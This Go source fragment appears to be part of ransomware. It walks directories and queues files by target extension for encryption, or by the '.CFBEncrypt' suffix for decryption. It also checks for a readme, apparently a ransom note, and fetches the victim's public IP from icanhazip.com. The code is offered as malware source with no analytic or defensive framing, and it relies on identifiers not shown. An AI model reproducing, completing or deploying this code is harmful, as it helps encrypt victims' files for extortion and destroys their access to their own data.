package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

func checkReadmeExists(file_name string) bool {
	if _, err := os.Stat(file_name); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func getInfo() string {
	resp, err := http.Get("http://icanhazip.com/")
	defer resp.Body.Close()
	if err != nil {
		fmt.Println(err)
	}
	ip, _ := ioutil.ReadAll(resp.Body)
	return string(ip)

}

func chDir(path string, mode int) {
	files, err := ioutil.ReadDir(path)
	check(err)
	for _, f := range files {
		ext := filepath.Ext(f.Name())

		switch mode {

		case ENC:
			for _, v := range extension {
				if ext == v {
					ch <- f.Name()
					break
				}
			}

		case DEC:
			if ext == ".CFBEncrypt" {
				ch <- f.Name()
			}
			break
		}

	}
	ch <- "done"
}
